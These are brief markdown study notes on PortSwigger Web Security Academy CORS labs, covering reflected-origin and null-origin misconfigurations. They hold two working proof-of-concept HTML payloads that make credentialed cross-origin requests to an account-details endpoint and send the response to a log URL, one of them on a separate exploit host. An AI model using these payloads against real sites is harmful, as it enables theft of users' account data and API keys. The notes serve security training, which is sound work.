# CORS
### Server-generated ACAO header from client-specified Origin header
#### Test
- Observe that the origin is reflected in the Access-Control-Allow-Origin header. 
#### POC
```html
<script>
var req = new XMLHttpRequest;
req.onload = reqListener;
req.open('get','https://ac131f9e1f2ffb79807d38fa00110007.web-security-academy.net/accountDetails');
req.withCredentials = true;
req.send();

function reqListener(){
    location = "/log?key=" + this.responseText;
}
</script>
```

***

### Whitelisted null origin value
#### Test
-   Send the request to Burp Repeater, and resubmit it with the added header `Origin: null`
-   Observe that the "null" origin is reflected in the `Access-Control-Allow-Origin` header.
#### POC
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
   var req = new XMLHttpRequest ();
   req.onload = reqListener;
   req.open('get','https://ac4e1fba1fe3b48280393d1700d700b8.web-security-academy.net/accountDetails',true);
   req.withCredentials = true;
   req.send();

   function reqListener() {
       location='https://acb11ff01f81b44780bd3ddc012a00a3.web-security-academy.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

***

### [Exploiting XSS](https://portswigger.net/web-security/cross-site-scripting/exploiting) via CORS trust relationships

***

### [Breaking TLS with poorly configured CORS](https://portswigger.net/web-security/cors)

***

### CORS vulnerability with trusted insecure protocols
#### TODO


***
### 

	